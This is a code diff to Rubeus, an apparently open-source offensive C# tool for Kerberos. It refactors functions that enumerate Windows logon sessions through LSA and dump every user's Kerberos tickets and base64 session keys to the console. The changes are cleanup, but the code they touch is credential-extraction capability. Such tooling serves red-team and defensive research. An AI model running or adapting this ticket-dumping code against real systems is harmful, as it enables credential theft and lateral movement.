@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Text.RegularExpressions;
 
 using Rubeus.lib;
@@ -165,7 +166,6 @@ namespace Rubeus
                 ulong count;
                 IntPtr luidPtr = IntPtr.Zero;
                 IntPtr iter = luidPtr;
-
                 uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs
 
                 for (ulong i = 0; i < count; i++) {
@@ -179,18 +179,15 @@ namespace Rubeus
                         string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
 
                         // exclude computer accounts unless instructed otherwise
-                        if (includeComputerAccounts || !Regex.IsMatch(username, ".*\\$$"))
-                        {
-
-                            System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
-                            string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
-                            string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
+                        if (includeComputerAccounts || !Regex.IsMatch(username, ".*\\$$")) {
+                            SecurityIdentifier sid = new SecurityIdentifier(data.PSiD);
+                            string domain = data.LoginDomain.GetValue();
+                            string authpackage = data.AuthenticationPackage.GetValue();
                             Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                             DateTime logonTime = systime.AddTicks((long)data.LoginTime);
-                            string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
-                            string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
-                            string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();
-
+                            string logonServer = data.LogonServer.GetValue();
+                            string dnsDomainName = data.DnsDomainName.GetValue();
+                            string upn = data.Upn.GetValue();
                             IntPtr ticketsPointer = IntPtr.Zero;
                             DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
 
@@ -603,112 +600,92 @@ namespace Rubeus
             int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
             int newStructSize = structSize + tName.MaximumLength;
             IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);
+            try {
+                // marshal the struct from a managed object to an unmanaged block of memory.
+                Marshal.StructureToPtr(request, unmanagedAddr, false);
+                // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
+                IntPtr newTargetNameBuffPtr = (IntPtr)(unmanagedAddr.ToInt64() + structSize);
+                // copy unicode chars to the new location
+                Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
+                // update the target name buffer ptr            
+                Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);
+                // actually get the data
+                int returnBufferLength;
+                int protocalStatus;
+                NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle,
+                    authenticationPackageIdentifier, unmanagedAddr, newStructSize,
+                    out responsePointer, out returnBufferLength, out protocalStatus);
+                // translate the LSA error (if any) to a Windows error
+                uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);
 
-            // marshal the struct from a managed object to an unmanaged block of memory.
-            Marshal.StructureToPtr(request, unmanagedAddr, false);
-            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
-            IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));
-            // copy unicode chars to the new location
-            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
-            // update the target name buffer ptr            
-            Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);
-            // actually get the data
-            int returnBufferLength;
-            int protocalStatus;
-            NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle,
-                authenticationPackageIdentifier, unmanagedAddr, newStructSize,
-                out responsePointer, out returnBufferLength, out protocalStatus);
-            // translate the LSA error (if any) to a Windows error
-            uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);
+                if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0)) {
+                    // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
+                    response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));
+                    Interop.KERB_EXTERNAL_TICKET responseTicket = response.Ticket;
+                    string serviceName = responseTicket.GetServiceName();
+                    string targetName = responseTicket.GetTargetName();
+                    string clientName = responseTicket.GetClientName();
+                    string domainName = responseTicket.DomainName.GetValue();
+                    string targetDomainName = responseTicket.TargetDomainName.GetValue();
+                    string altTargetDomainName = responseTicket.AltTargetDomainName.GetValue();
 
-            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0)) {
-                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
-                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));
+                    // extract the session key
+                    Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
+                    int sessionKeyLength = response.Ticket.SessionKey.Length;
+                    byte[] sessionKey = new byte[sessionKeyLength];
+                    Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
+                    string base64SessionKey = Convert.ToBase64String(sessionKey);
 
-                string serviceName = response.Ticket.GetServiceName();
-                string targetName = "";
-                if (response.Ticket.TargetName != IntPtr.Zero) {
-                    Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
-                    if (targetNameStruct.NameCount == 1) {
-                        targetName = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
+                    DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
+                    DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
+                    DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
+                    DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
+                    long timeSkew = response.Ticket.TimeSkew;
+                    int encodedTicketSize = response.Ticket.EncodedTicketSize;
+                    string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();
+
+                    // extract the ticket and base64 encode it
+                    byte[] encodedTicket = new byte[encodedTicketSize];
+                    Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
+                    string base64TGT = Convert.ToBase64String(encodedTicket);
+
+                    Console.WriteLine("  ServiceName              : {0}", serviceName);
+                    Console.WriteLine("  TargetName               : {0}", targetName);
+                    Console.WriteLine("  ClientName               : {0}", clientName);
+                    Console.WriteLine("  DomainName               : {0}", domainName);
+                    Console.WriteLine("  TargetDomainName         : {0}", targetDomainName);
+                    Console.WriteLine("  AltTargetDomainName      : {0}", altTargetDomainName);
+                    Console.WriteLine("  SessionKeyType           : {0}", sessionKeyType);
+                    Console.WriteLine("  Base64SessionKey         : {0}", base64SessionKey);
+                    Console.WriteLine("  KeyExpirationTime        : {0}", keyExpirationTime);
+                    Console.WriteLine("  TicketFlags              : {0}", ticketFlags);
+                    Console.WriteLine("  StartTime                : {0}", startTime);
+                    Console.WriteLine("  EndTime                  : {0}", endTime);
+                    Console.WriteLine("  RenewUntil               : {0}", renewUntil);
+                    Console.WriteLine("  TimeSkew                 : {0}", timeSkew);
+                    Console.WriteLine("  EncodedTicketSize        : {0}", encodedTicketSize);
+                    Console.WriteLine("  Base64EncodedTicket      :\r\n");
+                    // display the TGT, columns of 100 chararacters
+                    foreach (string line in Helpers.Split(base64TGT, 100)) {
+                        Console.WriteLine("    {0}", line);
                     }
-                    else if (targetNameStruct.NameCount == 2) {
-                        targetName = string.Format("{0}/{1}",
-                            Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim(),
-                            Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim());
-                    }
+                    Console.WriteLine("\r\n");
                 }
-
-                string clientName = "";
-                if (response.Ticket.ClientName != IntPtr.Zero) {
-                    Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
-                    if (clientNameStruct.NameCount == 1) {
-                        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
-                        clientName = clientNameStr1;
-                    }
-                    else if (clientNameStruct.NameCount == 2) {
-                        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
-                        string clientNameStr2 = Marshal.PtrToStringUni(clientNameStruct.Names[1].Buffer, clientNameStruct.Names[1].Length / 2).Trim();
-                        clientName = String.Format("{0}@{1}", clientNameStr1, clientNameStr2);
-                    }
+                else {
+                    Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
+                        winError, serverName, Helpers.GetNativeErrorMessage(winError));
                 }
-
-                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
-                string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
-                string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();
-
-                // extract the session key
-                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
-                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
-                byte[] sessionKey = new byte[sessionKeyLength];
-                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
-                string base64SessionKey = Convert.ToBase64String(sessionKey);
-
-                DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
-                DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
-                DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
-                DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
-                Int64 timeSkew = response.Ticket.TimeSkew;
-                Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;
-
-                string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();
-
-                // extract the ticket and base64 encode it
-                byte[] encodedTicket = new byte[encodedTicketSize];
-                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
-                string base64TGT = Convert.ToBase64String(encodedTicket);
-
-                Console.WriteLine("  ServiceName              : {0}", serviceName);
-                Console.WriteLine("  TargetName               : {0}", targetName);
-                Console.WriteLine("  ClientName               : {0}", clientName);
-                Console.WriteLine("  DomainName               : {0}", domainName);
-                Console.WriteLine("  TargetDomainName         : {0}", targetDomainName);
-                Console.WriteLine("  AltTargetDomainName      : {0}", altTargetDomainName);
-                Console.WriteLine("  SessionKeyType           : {0}", sessionKeyType);
-                Console.WriteLine("  Base64SessionKey         : {0}", base64SessionKey);
-                Console.WriteLine("  KeyExpirationTime        : {0}", keyExpirationTime);
-                Console.WriteLine("  TicketFlags              : {0}", ticketFlags);
-                Console.WriteLine("  StartTime                : {0}", startTime);
-                Console.WriteLine("  EndTime                  : {0}", endTime);
-                Console.WriteLine("  RenewUntil               : {0}", renewUntil);
-                Console.WriteLine("  TimeSkew                 : {0}", timeSkew);
-                Console.WriteLine("  EncodedTicketSize        : {0}", encodedTicketSize);
-                Console.WriteLine("  Base64EncodedTicket      :\r\n");
-                // display the TGT, columns of 100 chararacters
-                foreach (string line in Helpers.Split(base64TGT, 100)) {
-                    Console.WriteLine("    {0}", line);
-                }
-                Console.WriteLine("\r\n");
+                return true;
             }
-            else {
-                Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
-                    winError, serverName, Helpers.GetNativeErrorMessage(winError));
+            finally {
+                // clean up
+                if (IntPtr.Zero != responsePointer) {
+                    Interop.LsaFreeReturnBuffer(responsePointer);
+                }
+                if (IntPtr.Zero != unmanagedAddr) {
+                    Marshal.FreeHGlobal(unmanagedAddr);
+                }
             }
-
-            // clean up
-            Interop.LsaFreeReturnBuffer(responsePointer);
-            Marshal.FreeHGlobal(unmanagedAddr);
-            return true;
         }
 
         internal static void ListKerberosTicketDataAllUsers(uint targetLuid = 0, string targetService = "", bool monitor = false, bool harvest = false)
@@ -781,16 +758,15 @@ namespace Rubeus
                     // if we have a valid logon
                     if (data.PSiD != IntPtr.Zero) {
                         // user session data
-                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
-                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
-                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
-                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
+                        string username = data.Username.GetValue();
+                        SecurityIdentifier sid = new SecurityIdentifier(data.PSiD);
+                        string domain = data.LoginDomain.GetValue();
+                        string authpackage = data.AuthenticationPackage.GetValue();
                         Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                         DateTime logonTime = systime.AddTicks((long)data.LoginTime);
-                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
-                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
-                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();
-
+                        string logonServer = data.LogonServer.GetValue();
+                        string dnsDomainName = data.DnsDomainName.GetValue();
+                        string upn = data.Upn.GetValue();
                         IntPtr ticketsPointer = IntPtr.Zero;
                         DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
 
@@ -1063,7 +1039,9 @@ namespace Rubeus
                 // iterate through the result structures
                 IntPtr currTicketPtr = (IntPtr)((ticketsPointer.ToInt64() + (8 + ticketIndex * dataSize)));
 
-                if (ListKerberosTicketData(lsaHandle, authenticationPackageIdentifier, currTicketPtr, targetService)) {
+                if (ListKerberosTicketData(lsaHandle, authenticationPackageIdentifier, currTicketPtr,
+                    targetService))
+                {
                     extractedTicketCount++;
                 }
             }
